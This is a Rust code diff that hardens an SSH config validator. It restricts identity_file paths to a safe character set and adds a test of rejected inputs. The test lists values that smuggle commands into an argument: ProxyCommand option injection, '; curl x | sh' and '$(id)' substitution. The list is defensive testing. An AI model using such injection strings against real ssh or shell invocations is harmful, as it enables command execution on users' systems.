@@ -314,9 +314,10 @@ pub enum ConfigProblem {
         /// The repeated name.
         name: String,
     },
-    /// A server sets both `ssh` and connection fields, or neither.
+    /// A server sets `ssh` together with connection fields, or sets no `ssh` and no `host`.
     #[error(
-        "servers[{index}]: set either ssh (an ~/.ssh/config alias) or host, not both or neither"
+        "servers[{index}]: set either ssh (an ~/.ssh/config alias) or host with optional user, \
+         port and identity_file, not both"
     )]
     ServerConn {
         /// Position in the list.
@@ -335,10 +336,11 @@ pub enum ConfigProblem {
         /// The value found.
         value: String,
     },
-    /// `identity_file` is relative after `~/` expansion, or has control characters.
+    /// `identity_file` is relative after `~/` expansion, or has characters other than ASCII
+    /// letters, digits, `/`, `.`, `-` and `_`.
     #[error(
         "servers[{index}].identity_file = {value:?}: use an absolute path or one starting with \
-         ~/, without control characters"
+         ~/, of letters, digits, '/', '.', '-' or '_'"
     )]
     IdentityFile {
         /// Position in the list.
@@ -491,6 +493,9 @@ fn resolve_repos(raw: Vec<String>, problems: &mut Vec<ConfigProblem>) -> Vec<Rep
 
 /// Server names become folder names under each sweep, and the default macOS file system
 /// ignores case, so names are unique ignoring case and may not be `.` or `..`.
+///
+/// The name stays a plain `String` for now: nothing joins it into a path yet. When the sweep code
+/// does, make it a newtype only this function constructs, as `SshWord` is.
 fn resolve_servers(
     raw: Vec<RawServer>,
     home: &Path,
@@ -568,7 +573,14 @@ fn resolve_conn(
     let user = word("user", &server.user);
     let identity_file = server.identity_file.as_deref().and_then(|value| {
         let path = expand_home(value, home);
-        if path.is_absolute() && !value.chars().any(char::is_control) {
+        // The path goes into ssh arguments and agent prompts like an SshWord, so it is held to a
+        // safe path character set; a key under a folder with spaces needs a symlink.
+        let safe = path
+            .as_os_str()
+            .as_encoded_bytes()
+            .iter()
+            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'/' | b'.' | b'-' | b'_'));
+        if path.is_absolute() && safe {
             return Some(path);
         }
         problems.push(ConfigProblem::IdentityFile {
@@ -884,16 +896,24 @@ mod tests {
     }
 
     #[test]
-    fn identity_file_rejects_control_characters() {
-        let text = "[[servers]]\nname = \"s\"\nhost = \"h\"\n\
-                    identity_file = \"/tmp/id\\n-oProxyCommand=x\"\n";
-        assert_eq!(
-            resolve(text).unwrap_err(),
-            [ConfigProblem::IdentityFile {
-                index: 0,
-                value: "/tmp/id\n-oProxyCommand=x".into()
-            }]
-        );
+    fn identity_file_allows_only_safe_path_characters() {
+        for bad in [
+            "/tmp/id\n-oProxyCommand=x",
+            "/k -oProxyCommand=id",
+            "~/.ssh/id; curl x | sh",
+            "/keys/$(id)",
+            "/Library/Application Support/id",
+        ] {
+            let text = format!("[[servers]]\nname = \"s\"\nhost = \"h\"\nidentity_file = {bad:?}");
+            assert_eq!(
+                resolve(&text).unwrap_err(),
+                [ConfigProblem::IdentityFile {
+                    index: 0,
+                    value: bad.into()
+                }],
+                "{bad:?}"
+            );
+        }
     }
 
     #[test]
